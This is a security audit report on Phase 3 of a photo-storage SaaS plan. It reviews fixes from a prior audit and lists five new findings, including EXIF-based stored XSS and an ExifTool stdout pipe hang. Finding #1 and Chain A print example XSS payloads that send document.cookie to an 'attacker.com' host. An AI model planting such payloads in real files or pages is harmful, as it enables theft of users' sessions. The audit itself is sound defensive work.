# Security Audit — Phase 3: Storage & Media (v4.0)
**Source plan:** `2026-02-25-saas-conversion-phase-3.md` (v4.0)
**Supporting document:** `2026-02-24-saas-conversion-design.md` (v4.0)
**Audit version:** 2
**Prior audit:** `2026-03-04-saas-conversion-phase-3-security-audit-1.md` (v3.0 — all 8 findings resolved)
**Auditor:** Lead Cyber-Security Auditor
**Date:** 2026-03-04

---

## Scope & Prior Audit Status

**Materials received:**
- Phase 3 implementation plan (v4.0): MinIO configuration, upload pipeline, Redis Streams workers, scheduled tasks
- Design document (v4.0): full architecture, auth, RLS, rate limiting, deployment configuration
- Critical implementation reviews 1–4 (consulted for context)
- Security audit 1 (v3.0 baseline)

**All 8 findings from security audit 1 resolved in v4.0:**
- SA-1 (ExifTool CVE-2021-22204, High) — ExifTool pinned ≥ 12.24 via apt; Trivy CI scan added ✓
- SA-2 (Worker MinIO credentials not scoped, Medium) — Dedicated `worker-policy.json` with `GetObject/PutObject/DeleteObject`; separate `WORKER_MINIO_ACCESS_KEY`/`WORKER_MINIO_SECRET_KEY` ✓
- SA-3 (File extension source unspecified, Medium) — MIME-based extension via Tika allowlist; `original_filename` column for display only ✓
- SA-4 (Orphan reconciliation TOCTOU race, Medium) — `SELECT EXISTS(photo_id)` eliminates storage_key NULL comparison ✓
- SA-5 (EXIF/IPTC text stored without sanitization, Medium) — `Jsoup.parse(rawValue).text()` on caption/title/description; Phase 4 dangerouslySetInnerHTML note added ✓
- SA-6 (GET /photos/{id}/status ownership not tested, Medium) — `photoStatus_anotherUsersPhotoReturns403()` test stub added; ownership citation added ✓
- SA-7 (tmpfs size conflict, Low) — Design doc Section 7 update noted ✓
- SA-8 (Native library versions not pinned, Low) — libraw, libvips, ExifTool pinned to exact apt versions; FROM digest pinned ✓

**Scope for this audit:** New or residual security risks introduced or uncovered in v4.0.

---

## Three-Pass Analysis

### Pass 1: Reconnaissance & Attack Surface

**Entry points (Phase 3):**
- `POST /photos/upload` — multipart binary upload, authenticated, email-verification gated
- `GET /api/photos/{id}/status` — authenticated polling endpoint
- Redis Streams `photo-jobs` consumer (worker internal)
- Redis Streams `delete-jobs` consumer (worker internal)
- `TrashPurgeScheduler`, `OrphanReconciliationScheduler`, `UnverifiedAccountPurgeScheduler` (scheduled)
- Pre-signed MinIO URLs generated in API, fetched directly by browser

**Trust boundaries:**
```
Internet → Nginx (TLS) → Spring Boot API → Redis Streams → Worker container
                                        ↘ MinIO (internal Docker network) ↗
                        ↓
                   PostgreSQL (RLS, worker uses restricted role)
```

**Sensitive data flows introduced:**
- User-controlled binary files (≤ 200 MB) → Tika → MinIO
- Extracted EXIF/IPTC/XMP → `photo_metadata.exif_data` (JSONB) + `photos.caption/title/description`
- `caption`, `title`, `description` sanitized before storage via `Jsoup.parse().text()` ✓
- `photo_metadata.exif_data` JSONB — **all other EXIF fields stored without sanitization**
- Worker env: `WORKER_MINIO_ACCESS_KEY`, `WORKER_MINIO_SECRET_KEY`, `WORKER_DB_PASS`, `REDIS_PASSWORD`
- Pre-signed time-limited URLs (15 min thumbnails, 1 hr originals) in API responses

**Technology stack security posture:**
- Java 21 / Spring Boot 3: strong defaults, parameterized JPA queries
- ProcessBuilder argument arrays throughout: no command injection surface ✓
- ExifTool `-fast2`: limits parsing depth, reduces output size and attack surface ✓
- Worker: non-root, `cap_drop: ALL`, `read_only: true`, tmpfs `/tmp:size=1g,mode=1777` ✓
- Tika at API: magic-byte detection only (`Tika.detect()` profile, not `parse()`) — minimal parsing exposure ✓

---

### Pass 2: Systematic Vulnerability Hunting

---

## Finding #1: `photo_metadata.exif_data` JSONB Stored Without Sanitization — Staged Stored XSS Surface Broader Than Addressed Fields

**Vulnerability:** Stored Cross-Site Scripting — OWASP A03
**Severity:** Medium
**Confidence:** Medium
**Attack Complexity:** Low (craft file), Medium (requires Phase 4 rendering gap)

**Location:**
- Plan: Task 3.5, Step 4 — `MetadataExtractor` writes to `photo_metadata.exif_data`
- Plan: Task 3.5, Step 4 — sanitization covers `caption`, `title`, `description` on `photos` only
- Design doc: `photo_metadata (photo_id, exif_data JSONB, extracted_at)`

**Risk & Exploit Path:**

SA-1 Finding #5 correctly identified IPTC-injected XSS via `caption`/`title`/`description` and was resolved with `Jsoup.parse(rawValue).text()` sanitization. However, the fix is narrowly scoped to three named fields on the `photos` table. The `photo_metadata.exif_data` JSONB column stores the complete EXIF/IPTC/XMP dataset as returned by `metadata-extractor` (and ExifTool fallback) — including string-typed fields beyond the three sanitized ones.

String-typed EXIF fields that commonly appear in `exif_data` and may be displayed in a photo detail view in Phase 4:
- `UserComment` — free-form user text, embedded in-camera or post-processed
- `ImageDescription` — EXIF tag 0x010e, writable by any EXIF editor
- `Artist` — EXIF tag 0x013b
- `Copyright` — EXIF tag 0x8298
- `DocumentName`, `PageName` — TIFF tags
- `XMP:Description`, `XMP:Title`, `XMP:Rights` — XMP sidecar fields
- `IPTC:Keywords`, `IPTC:ObjectName` — other IPTC fields beyond the sanitized three
- `GPS:GPSAreaInformation` — string-typed GPS annotation field

An attacker uploads a crafted JPEG with `UserComment` set to `<img src=x onerror="fetch('//attacker.com?c='+document.cookie)">`. `metadata-extractor` reads this without alteration. The worker writes the raw value to `photo_metadata.exif_data`. In Phase 4, if any component renders EXIF fields (e.g., a photo detail panel showing "Camera:", "Copyright:", "Comment:") from the JSONB without React text nodes (`{value}` → safe) — specifically if it uses `dangerouslySetInnerHTML`, a Markdown renderer that passes through HTML, or any `.innerHTML` pattern — the payload executes.

The design doc's `search_vector` generated column tokenises these fields for FTS — tokenisation is safe. The risk is at Phase 4 render time.

**Evidence / Trace:**

```
Task 3.5, Step 4 — MetadataExtractor:

  // Sanitized (correct):
  String safeCaption = Jsoup.parse(rawCaption).text();   ← photos.caption
  String safeTitle   = Jsoup.parse(rawTitle).text();     ← photos.title
  String safeDesc    = Jsoup.parse(rawDescription).text(); ← photos.description

  // Not sanitized (gap):
  INSERT INTO photo_metadata (photo_id, exif_data, extracted_at)
  VALUES (?, ?, now())
  ON CONFLICT (photo_id) DO UPDATE ...
  ↑ exif_data contains ALL fields from metadata-extractor, including
    UserComment, ImageDescription, Artist, Copyright, XMP:* — raw, unsanitized ← GAP

Design doc schema:
  photo_metadata (photo_id UUID, exif_data JSONB, extracted_at TIMESTAMPTZ)
  ← exif_data is returned in Phase 4 API responses
  ← individual EXIF fields rendered in photo detail view
```

**Remediation:**
- **Primary fix (Phase 3):** At `MetadataExtractor` write time, iterate all string-typed EXIF values before assembling the JSONB payload and apply `Jsoup.parse(v).text()` to each:
  ```java
  Map<String, Object> sanitized = rawExifData.entrySet().stream()
      .collect(Collectors.toMap(
          Map.Entry::getKey,
          e -> e.getValue() instanceof String s ? Jsoup.parse(s).text() : e.getValue()
      ));
  ```
  This ensures the JSONB stored is clean regardless of which fields Phase 4 chooses to render. Add a test: `metadataExtractor_stripsHtmlTagsFromExifUserComment()`.
- **Defense-in-depth (Phase 4):** The plan's existing Phase 4 note — "never render via `dangerouslySetInnerHTML`" — must be extended to cover all EXIF fields rendered from `exif_data`, not just `caption`/`title`/`description`. Add this note to the Phase 4 plan explicitly.
- **Architectural improvement:** Consider storing a `sanitized_exif_data` JSONB alongside `raw_exif_data` so the raw values are preserved for forensic/debugging purposes while the rendered path always uses sanitised data.

---

## Finding #2: ExifTool ProcessBuilder — stdout Not Consumed — Pipe Buffer Exhaustion Causes Permanent Processing Failure

**Vulnerability:** Denial of Service / Processing Reliability — OWASP A05 (Security Misconfiguration)
**Severity:** Medium
**Confidence:** Medium
**Attack Complexity:** Low (attacker controls EXIF content; `-fast2` reduces but does not eliminate risk)

**Location:**
- Plan: Task 3.5, Step 4 — `MetadataExtractor` — ExifTool `-fast2` via `ProcessBuilder`
- Plan: Task 3.5, Step 3 — `ThumbnailGenerator` — libvips/libraw via `ProcessBuilder`

**Risk & Exploit Path:**

Java's `ProcessBuilder` creates an OS pipe for the child process's stdout (and stderr) when not explicitly redirected. The Linux default pipe buffer is 64 KB. If the child process writes more bytes than the buffer capacity to stdout before the parent reads from it, the child blocks on the write syscall. `Process.waitFor(5, TimeUnit.MINUTES)` then waits for termination that never comes — until the 5-minute timeout fires and `destroyForcibly()` kills the process.

The `MetadataExtractor` uses ExifTool as a metadata extraction fallback. ExifTool's output is the extracted metadata — the purpose of invoking it. If the plan does not specify reading `Process.getInputStream()`, the output is never consumed, the pipe fills, and ExifTool hangs. With `-fast2`, typical output is 5–30 KB for most photos. However:

- Photos with large `UserComment` or `XMP:Description` blocks: output can reach 80–150 KB
- RAW files with embedded GPS tracks or extensive XMP sidecar data: output can reach 200+ KB
- A crafted file designed to produce large EXIF output can reliably exceed 64 KB with `-fast2`

When this happens:
1. ExifTool hangs on the pipe write
2. `waitFor` times out after 5 minutes
3. `ProcessTimeoutException` is thrown
4. `PhotoJobConsumer` applies retry policy
5. After MAX_RETRIES (3), `processing_status = FAILED`, XACK → dead-letter
6. The photo is permanently failed with no user-visible explanation

An authenticated attacker crafting photos with oversized XMP data can permanently fail the processing of those specific uploads, consuming quota (Tx 1 committed, file in MinIO) while producing unusable results.

Additionally: since ExifTool's output is the metadata being extracted, if stdout is discarded rather than consumed, the fallback yields no data — a silent functional failure distinct from the pipe-hang scenario.

**Evidence / Trace:**

```
Task 3.5, Step 4 — MetadataExtractor:
  "ExifTool -fast2 as fallback via ProcessBuilder (same timeout policy as above)"

  // Implied implementation:
  ProcessBuilder pb = new ProcessBuilder("exiftool", "-fast2", "-json", tmpFile.toString());
  Process process = pb.start();
  // ← stdout (ExifTool metadata JSON) not consumed here
  boolean completed = process.waitFor(5, TimeUnit.MINUTES);  // ← BLOCKS if stdout pipe fills
  if (!completed) {
      process.destroyForcibly();
      throw new ProcessTimeoutException(...);  // ← triggered by pipe backpressure, not slow processing
  }
  // ← process.getInputStream() never read → metadata never captured anyway

Linux pipe buffer: 65,536 bytes
ExifTool JSON output for RAW with full EXIF: potentially 100–300 KB
Result: waitFor() blocks for exactly 5 minutes → timeout → permanent FAILED status
```

**Remediation:**
- **Primary fix:** Consume stdout asynchronously before or during `waitFor()`. The standard Java pattern for ProcessBuilder output capture:
  ```java
  ProcessBuilder pb = new ProcessBuilder("exiftool", "-fast2", "-json", tmpFile.toString());
  pb.redirectErrorStream(true);   // merge stderr into stdout
  Process process = pb.start();

  // Read stdout concurrently on a separate thread (or use ProcessBuilder.redirectOutput to file)
  CompletableFuture<String> outputFuture = CompletableFuture.supplyAsync(() -> {
      try (var reader = new BufferedReader(
               new InputStreamReader(process.getInputStream()))) {
          return reader.lines().collect(Collectors.joining("\n"));
      } catch (IOException e) { return ""; }
  });

  boolean completed = process.waitFor(5, TimeUnit.MINUTES);
  String output = outputFuture.join();   // JSON metadata for parsing
  ```
  Alternatively, redirect stdout to a temp file (`pb.redirectOutput(outputFile)`) and read the file after the process completes — simpler and avoids threading.
- **Add to plan:** Specify in Task 3.5, Step 4 that ExifTool output is captured via one of the above patterns and that the captured text is parsed as JSON to extract the metadata fields.
- **Add to plan:** Note that libvips and libraw outputs (thumbnails written to files, not stdout) do not have this issue — clarify per-tool stdout/stderr handling expectations.
- **Add test:** `metadataExtractor_capturesExifToolOutputForLargeExifPhoto()` — assert that a photo fixture with large XMP data produces correct metadata (not a timeout/FAILED result).

---

## Finding #3: Java Library Versions Not Pinned — Apache Tika, metadata-extractor, Jsoup Supply Chain Gap

**Vulnerability:** Vulnerable and Outdated Components — OWASP A06
**Severity:** Low
**Confidence:** High
**Attack Complexity:** Low (passive — affects build reproducibility and CVE tracking)

**Location:**
- Plan: Task 3.5, Steps 2–4 — references Apache Tika, metadata-extractor, Jsoup; no version pin specified for any
- Plan: Task 3.1, Step 3 — MinIO Java SDK used; no version pin specified
- Plan: Task 3.6 — ShedLock pinned to `6.0.2` ✓ (correctly handled)
- Plan: Task 3.3, Step 3 — `application.yml` references; `build.gradle` version for worker module not addressed

**Risk & Exploit Path:**

The plan correctly pins all native binaries (libraw, libvips, ExifTool, Docker base image digest). It correctly pins ShedLock. However, three Java libraries that process user-uploaded file content are not mentioned for version pinning:

- **Apache Tika:** Processes file magic bytes at upload time and in worker `TikaValidator`. Tika has had CVEs including Java deserialization via certain parsers (Tika 1.x OLE2 processor — not applicable if detect-only). The plan uses detection-mode Tika, which reduces exposure. However, if `api/build.gradle` uses a loose version (`'org.apache.tika:tika-core:+'`), a compromised Maven mirror could serve a backdoored version on next build.

- **metadata-extractor (Drew Noakes library):** Processes the complete binary content of user-uploaded images (EXIF/IPTC/XMP parsing). This library has had issues with infinite loops and out-of-bounds reads on malformed files (though these are typically functional, not exploitable, in Java). No known major CVEs in recent versions, but version pinning ensures reproducible builds and enables audited dependency tracking.

- **Jsoup:** Used for `caption`/`title`/`description` sanitization in `MetadataExtractor`. Jsoup itself does not process untrusted file formats — it receives string values. Jsoup CVEs are rare. However, it should be pinned for consistency. If Jsoup is unpinned and a version is released that changes `parse().text()` semantics, sanitization silently degrades.

- **MinIO Java SDK:** Handles multipart upload to MinIO. An unpinned version could silently introduce breaking changes in credential handling or pre-signed URL generation.

**Impact:** Non-reproducible builds. Compromised Maven mirror (supply chain attack) could inject backdoored JAR. Inability to audit which version was deployed against known CVE databases.

**Evidence / Trace:**

```
Plan Task 3.5, Step 2 (TikaValidator):
  "Apache Tika content-type check"
  ← no version specified in plan
  ← Gradle dependency: 'org.apache.tika:tika-core:???'

Plan Task 3.5, Step 4 (MetadataExtractor):
  "metadata-extractor (Java) as primary"
  "Jsoup.parse(rawCaption).text()" — Jsoup sanitization
  ← no versions specified for either library

Contrast with:
Plan Task 3.6 (ShedLock):
  "shedlock-spring:6.0.2" — correctly pinned ✓
Plan Task 3.5 (ExifTool):
  "libimage-exiftool-perl=X.Y.Z" — correctly pinned ✓
```

**Remediation:**
- **Primary fix:** Add version pinning guidance to Task 3.5 (and the API build.gradle section if one exists in the plan):
  ```groovy
  // api/build.gradle and worker/build.gradle
  implementation 'org.apache.tika:tika-core:2.9.2'            // pin; check for updates
  implementation 'com.drewnoakes:metadata-extractor:2.19.0'   // pin; check for updates
  implementation 'org.jsoup:jsoup:1.18.3'                     // pin; check for updates
  implementation 'io.minio:minio:8.5.12'                      // pin; check for updates
  ```
  Verify each against Maven Central for the current stable release at implementation time. Add a note consistent with the ShedLock pinning guidance already in the plan.
- **Architectural improvement:** Add all Java dependencies to the Trivy/Grype scan scope (SBOM-based scanning). Trivy can scan JARs for known CVEs via `trivy fs --scanners vuln .` on the build output.

---

## Finding #4: Upload Compensating Transaction — No Floor Guard on `used_bytes` Decrement

**Vulnerability:** Business Logic Flaw — OWASP A04
**Severity:** Low
**Confidence:** High
**Attack Complexity:** Medium (requires MinIO failure after Tx 1 commit)

**Location:**
- Plan: Task 3.2, Step 4 — upload transaction order, step 6 (compensating Tx on MinIO failure)
- Plan: Task 3.6, Step 2 — `TrashPurgeScheduler` null-`storage_key` CTE (correctly uses `GREATEST(0, ...)`)

**Risk & Exploit Path:**

The plan specifies two places where `used_bytes` is decremented:

1. **Upload compensating Tx (Task 3.2, step 6):** "compensating Tx — delete the photo row, decrement `used_bytes`" — no floor guard specified.
2. **Null-`storage_key` CTE (Task 3.6, Step 2):** `SET used_bytes = GREATEST(0, u.used_bytes - d.file_size)` — floor guard correctly present.

If, due to a prior bug (e.g., a double compensating-Tx execution, a previous audit failure, or an incorrectly-applied migration), `used_bytes` is already at 0 when the compensating Tx fires, the update `SET used_bytes = used_bytes - file_size` produces a negative value. PostgreSQL stores this as a negative `BIGINT`. On next upload, the quota check `used_bytes + file_size > quota_bytes` evaluates against a negative base — the user gets an artificially inflated effective quota. They can upload more data than their plan allows until `used_bytes` recovers to a positive value.

This is a defense-in-depth failure: the inconsistency between the two decrement paths means the null-`storage_key` CTE's defensive design is not applied uniformly.

**Evidence / Trace:**

```
Task 3.2, Step 4 — Upload compensating Tx (step 6):
  DELETE photo row WHERE id = :id
  UPDATE users SET used_bytes = used_bytes - :file_size WHERE id = :user_id
  ↑ No GREATEST(0, ...) floor guard                           ← INCONSISTENT

Task 3.6, Step 2 — null-storage_key CTE:
  UPDATE users u
  SET used_bytes = GREATEST(0, u.used_bytes - d.file_size)   ← floor guard present ✓
  FROM deleted d
  WHERE u.id = d.user_id;
```

**Remediation:**
- **Primary fix:** Add a `GREATEST(0, ...)` floor guard to the upload compensating Tx, consistent with the null-`storage_key` CTE:
  ```sql
  UPDATE users
  SET used_bytes = GREATEST(0, used_bytes - :file_size)
  WHERE id = :user_id
  ```
  Or add a DB-level constraint: `ALTER TABLE users ADD CONSTRAINT users_used_bytes_non_negative CHECK (used_bytes >= 0)`. The constraint would prevent negative values from being stored at all, turning the inconsistency into a hard failure rather than a silent data corruption.
- **Architectural improvement:** Centralise all quota decrement operations through a single `QuotaService.decrementBytes(userId, bytes)` method that always applies the floor guard, preventing divergent implementations.

---

## Finding #5: `delete-jobs` Enqueued With Null Storage Keys for Null-`storage_key` Photo Rows — `DeleteJobConsumer` NPE / Dead-Letter Backlog

**Vulnerability:** Security Misconfiguration / Availability — OWASP A05
**Severity:** Low
**Confidence:** High
**Attack Complexity:** Medium (requires upload compensating-Tx double failure)

**Location:**
- Plan: Task 3.6, Step 2 — `TrashPurgeScheduler` null-`storage_key` cleanup
- Plan: Task 3.4, Step 3 — `DeleteJobConsumer` — processes `delete-jobs` stream messages

**Risk & Exploit Path:**

The null-`storage_key` cleanup section in `TrashPurgeScheduler` begins:
> "For each batch: 1. Enqueue Redis delete-jobs (Lettuce pipeline) — jobs are in Redis before any DB row is removed"

The `delete-jobs` stream message schema requires four fields: `photo_id`, `original_key`, `thumbnail_sm`, `thumbnail_md`. For rows where `storage_key IS NULL`, none of the three object keys are known — the upload either failed before the MinIO upload or failed before Tx 2 committed. The scheduler has no basis on which to populate `original_key`, `thumbnail_sm`, or `thumbnail_md`.

`DeleteJobConsumer` receives the message and calls `minioClient.removeObject(RemoveObjectArgs.builder().bucket(bucket).object(null).build())` — or equivalent with an empty string. MinIO SDK behavior with null/empty object name: throws `IllegalArgumentException` or `ErrorResponseException`. The consumer's exception handler does not XACK (since the deletion "failed"), the message stays in the PEL, XAUTOCLAIM reclaims it after 30 minutes, and the cycle repeats. After MAX_RETRIES, the message is moved to `dead-letter`. Over time, every upload compensating-Tx double failure produces a permanent dead-letter entry and a storm of retries during the 3×30-minute retry window.

The consumer's retry budget is shared with legitimate delete-jobs (trash purge, unverified account purge). Under sustained load of upload failures, the dead-letter stream grows without bound, consuming Redis memory.

**Evidence / Trace:**

```
Task 3.6, Step 2 — TrashPurgeScheduler null-storage_key cleanup:
  "For each batch:
   1. Enqueue Redis delete-jobs (Lettuce pipeline)"
  ← batch sourced from:
     SELECT ... WHERE storage_key IS NULL AND deleted_at IS NULL ...
  ← storage_key IS NULL → original_key = ??? thumbnail_sm = ??? thumbnail_md = ???
  ← delete-jobs message written with null/empty object key fields  ← INVALID

Task 3.4, Step 3 — DeleteJobConsumer:
  "Parse all four message fields: photo_id, original_key, thumbnail_sm, thumbnail_md"
  "Delete all three MinIO keys per message"
  ← minioClient.removeObject(null key) → MinIO SDK exception        ← CRASH
  ← XACK not called → PEL entry persists → retry loop              ← DEAD-LETTER
```

**Remediation:**
- **Primary fix:** For null-`storage_key` rows, skip the delete-job enqueue entirely. These rows have no known MinIO objects to delete, and any MinIO objects from a Tx-2 failure (MinIO object exists but storage_key never committed) are handled by `OrphanReconciliationScheduler` on its weekly run. Update Task 3.6, Step 2:
  ```
  For each null-storage_key batch:
  1. (No delete-job enqueue — storage_key is unknown; MinIO orphans,
     if any, are cleaned up by OrphanReconciliationScheduler weekly)
  2. Execute CTE to atomically delete rows and decrement used_bytes
  ```
- **Defense-in-depth:** Add null/empty-key validation at the head of `DeleteJobConsumer` before any MinIO call:
  ```java
  if (originalKey == null || originalKey.isBlank()) {
      log.error("delete-job received with null originalKey, photo_id={} — XACK and skip", photoId);
      redisCommands.xack(DELETE_JOBS_STREAM, CONSUMER_GROUP, messageId);
      return;
  }
  ```
  This prevents cascading retry storms if a malformed message enters the stream by any other path.

---

### Pass 3: Cross-Cutting & Compositional Analysis

**Chain A: Crafted EXIF + Phase 4 JSONB Rendering → Stored XSS → CSRF/Session Abuse (Finding #1)**

Identical chain structure to SA-1 Chain B (now patched for caption/title/description), but broader in scope. An attacker uploads a JPEG with `UserComment: <script>document.location='//attacker.com?c='+btoa(document.cookie)</script>`. Worker stores raw value in `exif_data` JSONB. Phase 4 renders a "Camera Details" panel that iterates EXIF key-value pairs from the API response and uses any rendering pattern other than React text nodes. XSS executes. This chain is passive in Phase 3 but becomes active on Phase 4 rollout.

The difference from the patched SA-1 finding: Phase 4 note was added for caption/title/description specifically; there is no corresponding note for `exif_data` fields. Phase 4 engineers may not know which JSONB fields are potentially malicious.

**Chain B: Oversized EXIF Output + ExifTool pipe hang → Targeted Processing DoS (Finding #2)**

An attacker with legitimate access uploads a batch of crafted photos (large XMP blocks, each ≤ 200 MB and within quota) that each trigger ExifTool pipe buffer exhaustion. Each photo consumes:
- 5 minutes (waitFor timeout) × MAX_RETRIES (3) = 15 minutes of worker time
- Plus XAUTOCLAIM idle wait between retries: 30 minutes × 2 retries = 60 minutes

A single crafted photo ties up the single-threaded worker for 75 minutes. With quota (e.g., 20 GB), an attacker can upload ~100 200 MB files and occupy the worker for several days, preventing other users' legitimate photos from processing. The worker does not gate on per-user job count.

Mitigating factor: ExifTool `-fast2` significantly reduces output size for most files. The practical trigger size depends on XMP sidecar data size. The fix (consuming stdout) eliminates this chain entirely.

**Chain C: Null delete-job → Dead-letter growth → Redis memory pressure (Finding #5)**

Under sustained double-failure conditions (MinIO unreliable, compensating Tx failing repeatedly), every failed upload produces a null-key delete-job. Each goes through: 3 retries × 30-minute XAUTOCLAIM window = 90 minutes in the PEL per job, plus a permanent dead-letter entry. With Redis memory pressure, other streams (photo-jobs) experience degraded performance. The fix (skip delete-job for null-storage_key rows) eliminates this chain with no architectural cost.

**Defense-in-depth assessment:**

The v4.0 plan achieves a substantially stronger security posture than v3.0. The CISA KEV ExifTool vulnerability (SA-1 F#1) is eliminated. Worker MinIO credentials are now scoped. EXIF/IPTC text fields on `photos` are sanitized. The orphan reconciliation TOCTOU race is eliminated. Remaining issues are narrowly scoped and do not undermine the core defense-in-depth model.

The two medium findings are both "incomplete by-design patterns": Finding #1 is the write-path sanitization stopping three fields short of full JSONB coverage; Finding #2 is the ProcessBuilder pattern correctly specified for stdout-less tools (libraw, libvips write to files) but incompletely specified for ExifTool which writes metadata to stdout. Both are gaps in otherwise correct patterns — they can be fixed with minor additions to the plan.

---

## 1. Executive Summary

Phase 3 v4.0 successfully resolves all eight findings from security audit 1. The ExifTool CVE-2021-22204 RCE risk (CISA KEV) is eliminated by version pinning and Trivy CI enforcement. Worker MinIO credentials are now appropriately scoped. MIME-based extension derivation removes the user-controlled storage key attack surface. The orphan reconciliation TOCTOU race is closed by the `SELECT EXISTS(photo_id)` redesign.

Two medium-severity findings remain. Finding #1 extends the known EXIF/IPTC stored XSS concern (patched in SA-1 for three fields) to the `photo_metadata.exif_data` JSONB column, which stores all EXIF string fields without sanitization. The fix belongs in Phase 3's write path, not deferred to Phase 4's render path. Finding #2 is a ProcessBuilder specification gap: ExifTool writes metadata to stdout but the plan does not specify stdout consumption, which causes pipe buffer exhaustion on photos with large XMP data, producing permanent processing failures and enabling a targeted resource exhaustion attack.

Three low-severity findings cover: Java library version pinning (inconsistent with the correctly-pinned native binaries), a missing `GREATEST(0, ...)` floor guard on the upload compensating transaction (inconsistent with the correctly-guarded CTE), and a null-key delete-job enqueue for null-`storage_key` rows that would produce dead-letter backlog. All five findings are targeted specification additions requiring no architectural change.

---

## 2. Findings Summary Table

| # | Title | Category | Severity | Confidence | Similar Instances | Status |
|---|-------|----------|----------|------------|-------------------|--------|
| 1 | `photo_metadata` JSONB stored unsanitized — broader stored XSS surface | A03 | Medium | Medium | Multiple EXIF string fields | Fix before impl |
| 2 | ExifTool ProcessBuilder stdout not consumed — pipe buffer exhaustion → permanent FAILED | A05 | Medium | Medium | 0 (libvips/libraw write to files) | Fix before impl |
| 3 | Java library versions (Tika, metadata-extractor, Jsoup) not pinned | A06 | Low | High | 3 libraries | Fix opportunistically |
| 4 | Upload compensating Tx quota decrement — no `GREATEST(0, ...)` floor guard | A04 | Low | High | 0 (CTE has guard; this path doesn't) | Fix opportunistically |
| 5 | Null-key delete-jobs enqueued for null-`storage_key` rows — dead-letter buildup | A05 | Low | High | 0 | Fix opportunistically |

---

## 3. Security Quality Score (SQS)

| Finding | Severity | Deduction |
|---------|----------|-----------|
| #1 | Medium | −8 |
| #2 | Medium | −8 |
| #3 | Low | −2 |
| #4 | Low | −2 |
| #5 | Low | −2 |

**Raw score:** 100 − 8 − 8 − 2 − 2 − 2 = **78/100**

**Hard gates triggered:** None
- No Critical findings
- No CISA KEV CVEs present (SA-1 F#1 resolved)
- No hardcoded secrets in source

**Posture: Acceptable — deploy only with remediation commitment and timeline**

Both medium findings (F#1, F#2) should be resolved before Phase 4 frontend work begins:
- F#1 creates a stored XSS attack surface that Phase 4 rendering patterns must avoid — fixing it at the Phase 3 write path is strictly cheaper
- F#2 causes a functional regression (permanent FAILED status on large-EXIF photos) that would appear as a production bug the day Phase 3 is deployed

---

## 4. Positive Security Observations

1. **ExifTool RCE risk fully eliminated.** The CISA KEV CVE-2021-22204 finding from SA-1 is resolved correctly: `libimage-exiftool-perl=X.Y.Z` pinned to a specific apt version verified ≥ 12.24, Trivy CI scan added with HIGH/CRITICAL gate. This is the highest-impact security improvement in v4.0 and is handled with production-grade rigor.

2. **Worker MinIO least privilege is well-designed.** The `worker-policy.json` restricts to `s3:GetObject/PutObject/DeleteObject` on `jpt-photos/*` only. The provision steps (`mc admin user add`, `mc admin policy create/attach`) are documented. The separation of `WORKER_MINIO_ACCESS_KEY`/`WORKER_MINIO_SECRET_KEY` from the API's credentials is architecturally correct. If the worker is compromised via a native library CVE, the blast radius is limited to object-level operations within the bucket — not admin operations or credential rotation.

3. **Upload transaction order is security-conscious.** The `SELECT FOR UPDATE` on the user row, the row-insert-before-MinIO-upload ordering, the compensating transaction with CRITICAL-level logging on double failure, and the `TrashPurgeScheduler` null-`storage_key` recovery together form a coherent defence against quota drift and data inconsistency. This is rare attention to failure-path security in implementation plans.

4. **MIME-based extension derivation eliminates an entire attack class.** Deriving the file extension exclusively from Tika magic-byte detection, mapping through a maintained allowlist, and storing the user-supplied filename in `original_filename` for display only is the architecturally correct solution to user-controlled storage key injection. The decision is correctly documented with rationale ("user-supplied extensions are unconstrained and user-controlled; Tika detection is system-controlled").

5. **Distributed scheduler locking and startup recovery are correct.** ShedLock on all three schedulers prevents duplicate purge runs across API instances. The Lua ownership-checking lock refresh for startup recovery correctly handles the GC-pause / lock-expiry race condition that a plain `SET XX` would not. The PEL pagination into a `Set<String>` correctly handles large-outage recovery scenarios. These are subtle distributed systems security properties, and all three are specified correctly.

---

## 5. Prioritized Remediation Roadmap

**1. Finding #2 — ExifTool stdout not consumed**
- Why first: Functional regression that manifests immediately in production on first EXIF-rich photo upload; also enables targeted DoS against the worker
- Action: Specify async stdout consumption pattern in Task 3.5, Step 4; add `metadataExtractor_capturesExifToolOutputForLargeExifPhoto()` test
- Effort: **Quick Win** (3–5 lines of code; one test)
- Owner: Backend

**2. Finding #1 — `photo_metadata` JSONB stored unsanitized**
- Why second: Phase 3 is the write path — fixing sanitization here is one line per field; fixing it in Phase 4 requires auditing every UI component that renders EXIF data; deferred fix is significantly higher cost and risk
- Action: Apply `Jsoup.parse(v).text()` to all String-typed EXIF values before JSONB assembly; extend Phase 4 note to cover all EXIF fields; add `metadataExtractor_stripsHtmlTagsFromExifUserComment()` test
- Effort: **Quick Win** (~10 lines of code; one test)
- Owner: Backend

**3. Finding #5 — Null delete-jobs for null-storage_key rows**
- Why third: Prevents dead-letter buildup and DeleteJobConsumer NPE; zero architectural cost to fix
- Action: Remove step 1 ("Enqueue delete-jobs") from the null-`storage_key` cleanup section in Task 3.6; add null-key guard at head of `DeleteJobConsumer`
- Effort: **Quick Win** (plan text change; 5-line guard in consumer)
- Owner: Backend

**4. Finding #3 — Java library versions not pinned**
- Why fourth: Reproducible builds and CVE auditability; consistent with the native binary pinning already in the plan
- Action: Add Tika, metadata-extractor, Jsoup, MinIO SDK version pins to `build.gradle` spec in plan; add to Trivy scan scope
- Effort: **Quick Win** (4 version strings in plan; Trivy flag)
- Owner: Backend / DevOps

**5. Finding #4 — Compensating Tx no floor guard**
- Why fifth: Low probability but data integrity inconsistency; easy to fix with `GREATEST(0, ...)` or DB check constraint
- Action: Add `GREATEST(0, used_bytes - :file_size)` to upload compensating Tx in Task 3.2, Step 4; consider centralizing quota decrement in a `QuotaService`
- Effort: **Quick Win** (one SQL change; optional service refactor)
- Owner: Backend
